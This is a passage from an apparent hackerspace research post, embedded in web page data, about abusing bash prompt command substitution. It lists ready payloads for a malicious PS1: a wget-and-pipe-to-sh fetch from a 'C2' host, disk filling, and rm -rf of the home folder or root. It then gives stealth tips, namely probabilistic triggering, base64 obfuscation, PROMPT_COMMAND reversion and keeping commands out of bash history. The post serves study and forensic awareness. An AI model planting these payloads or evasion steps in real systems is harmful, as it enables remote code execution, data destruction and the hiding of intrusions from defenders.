character\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRCE / fetching commands from a C2 server:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'$(wget -q -O - www.example.com/c2/script_to_run.sh | sh)\\u@\\h:\\w$ '\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eGradually filling up the file system:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'`echo \\`cat ~/.profile\\` \u003e\u003e ~/.profile`\\u@\\h:\\w$ '\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eDeleting a user's home folder:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'$(rm -rf ~)\\u@\\h:\\w$ '\n\n'$(rm -rf /* \u003e /dev/null 2\u003e\u0026#x26;1)\\u@\\h:\\w$ '\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe latter will not delete everything, but it will delete everything the user is privileged for, including their home folder. As a bonus, it will also tie things up for a while as it traverses the entire filesystem.\u003c/p\u003e\n\u003cp\u003eDeleting all files (after tricking them into entering the sudo pw)\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'$(sudo rm -rf /*)\\u$\\h:\\w$ '\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSome potential attacks are limited by the command substitution occurring in a subshell.  Future work might include how to potentially use a tool like script to log all shell text, or how to build an actual keylogger, which would be more complicated.  Another complicated exploit might involve engineering the user into entering their current password, which could be exfiltrated or used to change the password itself.\u003c/p\u003e\n\u003ch1\u003eEvading detection:\u003c/h1\u003e\n\u003cp\u003eSome actions, like erasing a user’s home folder, or fork bombing, are so drastic that they likely result in immediate discovery of the attack.  An attacker can be sneakier by combining some of the more impactful attacks with a probabilistic check.  If a fork bomb only executes 1 in 100 times, for instance, it is much more likely to misdirect blame toward something else:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'if [ $(($RANDOM % 100)) -eq 1 ]; then do_something_nasty; fi'\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese commands kind of stick out in PS1.  Maybe we can obfuscate them a little bit.  What about base64 encoding your command?\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'$(echo c2xlZXAgMg== | base64 -d)'\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou could also use \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e to auto-revert \u003ccode\u003ePS1\u003c/code\u003e, to hide your tracks.  If you recall above, \u003ccode\u003ePS1\u003c/code\u003e cannot do this to itself, due to the subshell.  Only a \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e instruction can do this reversion.  Despite that, there are lots of ways to do this (assume \u003ccode\u003echeck_for_something\u003c/code\u003e is a function the attacker controls):\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e'if [ \"$(check_for_something)\" -eq 1 ]; then PS1=$OLDPS1 \"; fi'\n'[ “$(check_something 2\u003e /dev/null)” ] \u0026#x26;\u0026#x26; PS1=$OLDPS' # trivially more concise, but potentially less robust than an if statement\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRecent versions of bash (since 5.1-alpha) allow \u003ccode\u003ePROMPT_COMMAND\u003c/code\u003e to be an array of commands.  This could facilitate removing incriminating commands without having to selectively regenerate an entire, long string.\u003c/p\u003e\n\u003cp\u003eSpeaking of covering your tracks, remember how prompt command substitution does not show up in bash history? There are, of course, many ways to avoid recording commands in the bash history, but one of them might be executing them by prompt command substitution. Forensic investigators should already understand that bash history is relatively specific, but not sensitive, diagnostically speaking.  In other words: if something is in the history, it probably happened...  but if it’s not there, it doesn’t mean it didn’t happen.\u003c/p\u003e\n\u003cp\u003eA final word on user names: this whole journey began with the observation (By Ben Kallus and Jonah Weinberg of ISTS/Dartmouth College) that linux behaves strangely when a user has a malicious name, like \u003ccode\u003e$(rm -rf ~)\u003c/code\u003e.  But the user name could be malicious without invoking command substitution.  For instance, the user name \"\u003ccode\u003e../tmp\u003c/code\u003e\", yields an unexpected account with a valid, but non-obvious, home folder, which could serve as a back door of sorts.\u003c/p\u003e\n\u003cp\u003eThere have even been recent debates9 about what kinds of special characters, non-ASCII character sets, or other patterns warrant closer scrutiny in Debian user names.  While it is understandable and perhaps even supportable that many users want characters beyond ASCII, great care should be taken to avoid introducing new security risks.  The case of character confusion over identical- or similar-appearing unicode characters is a prime example.  One must expect that any broad increase in complexity will inevitably carry with it new security risks, and prepare accordingly.\u003c/p\u003e\n\u003cp\u003ePrompt command substitution is powerful, flexible, and completely agnostic towards your security concerns.  Many of the above examples can be combined for greater effect.  Have fun experimenting with them, and try not to erase your home folder while you're at it!\u003c/p\u003e\n\u003ch1\u003eAcknowledgements\u003c/h1\u003e\n\u003cp\u003eThanks to Ben Kallus and Jonah Weinberg for ideas and discussions, and for originally identifying user name command substitution.  Additional thanks to Solra Bizna and Pips of 801 Labs for peer review.\u003c/p\u003e\n\u003ch1\u003eReferences\u003c/h1\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eBratus, et al. Curing the Vulnerable Parser: Design Patterns for Secure Input Handling.  Usenix ;login:, Spring 2017 Vol. 42, NO. 1, 32-39\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://www.gnu.org/software/bison/\"\u003ehttps://www.gnu.org/software/bison/\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://www.cs.utexas.edu/~novak/yaccpaper.htm\"\u003ehttps://www.cs.utexas.edu/~novak/yaccpaper.htm\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://savannah.gnu.org/patch/?10496\"\u003ehttps://savannah.gnu.org/patch/?10496\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://git.savannah.gnu.org/git/bash.git\"\u003ehttps://git.savannah.gnu.org/git/bash.git\u003c/a\u003e, branch 'devel' commit 25e213a, 24 Jan 2025.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://manpages.debian.org/bookworm/ash/ash.1.en.html\"\u003ehttps://manpages.debian.org/bookworm/ash/ash.1.en.html\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://zsh.sourceforge.io/Doc/Release/Prompt-Expansion.html\"\u003ehttps://zsh.sourceforge.io/Doc/Release/Prompt-Expansion.html\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://mattcasmith.net/2022/02/22/bash-history-basics-behaviours-forensics\"\u003ehttps://mattcasmith.net/2022/02/22/bash-history-basics-behaviours-forensics\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://lwn.net/ml/all/Zz9xogrnHDSFjZUn@torres.zugschlus.de/\"\u003ehttps://lwn.net/ml/all/Zz9xogrnHDSFjZUn@torres.zugschlus.de/\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n"},"__N_SSG":true},"page":"/research-portal/post/[slug]","query":{"slug":"bash-command-injection"},"buildId":"vPr4pjPUl4ysq0tKOvn75","nextExport":false,"isFallback":false,"gsp":true,"head":[["meta",{"charSet":"utf-8"}],["title",{"children":"Stupid bash tricks- command substitution, command injection, and the bash command prompt | 801 Labs"}],["meta",{"name":"description","content":"description"}],["link",{"rel":"canonical","href":"https://www.801labs.org/research-portal/post/bash-command-injection"}],["link",{"rel":"icon","href":"/favicon.png","sizes":"16x16"}],["meta",{"property":"og:title","content":"Stupid bash tricks- command substitution, command injection, and the bash command prompt | 801 Labs"}],["meta",{"property":"og:description","content":"801 Labs is a Salt Lake City based hackerspace created by local information technology, electronics, and information security enthusiasts."}],["meta",{"property":"og:image","content":"https://www.801labs.org2024/01/bash-source.png"}],["meta",{"property":"og:url","content":"https://www.801labs.org/research-portal/post/bash-command-injection"}],["meta",{"property":"og:site_name","content":"801 Labs"}],["meta",{"name":"twitter:card","content":"summary_large_image"}],["meta",{"name":"twitter:site","content":"@801Labs"}],["meta",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["meta",{"name":"theme-color","content":"#6bf0c2"}],["link",{"href":"https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;0,900;1,400\u0026family=Tomorrow:wght@400;600;700\u0026display=swap","rel":"stylesheet"}],["meta",{"name":"google-site-verification","content":"QnlAT_0caLTAeL1e8V-RlHWBX7xauM_CnxY_5-ltIF4"}]]}</script><script nomodule="" src="/_next/static/chunks/polyfills-08fbb0bb0c9e09648ed7.js"></script><script src="/_next/static/chunks/main-b734f4d0c2c599295fe6.js" async=""></script><script src="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" async=""></script><script src="/_next/static/chunks/framework.464b393922c27508c360.js" async=""></script><script src="/_next/static/chunks/commons.baecec2b1f31cc8f0ab6.js" async=""></script><script src="/_next/static/chunks/pages/_app-24410fa0a3d143b2bfcc.js" async=""></script><script src="/_next/static/chunks/cb1608f2.9b44609261640b8f626b.js" async=""></script><script src="/_next/static/chunks/a9a7754c.53d20200875279da8636.js" async=""></script><script src="/_next/static/chunks/16bc220b6d50f93026463b2cd002c45681ffbe2f.62ec2799f7445d763091.js" async=""></script><script src="/_next/static/chunks/269ea3ef5216fdb5e29fe1b24ee03a8936e3d31a.82f69e01bd7fbd7d6f07.js" async=""></script><script src="/_next/static/chunks/pages/research-portal/post/%5Bslug%5D-4d5753f44f6a2e9d1cc2.js" async=""></script><script src="/_next/static/vPr4pjPUl4ysq0tKOvn75/_buildManifest.js" async=""></script><script src="/_next/static/vPr4pjPUl4ysq0tKOvn75/_ssgManifest.js" async=""></script></body></html>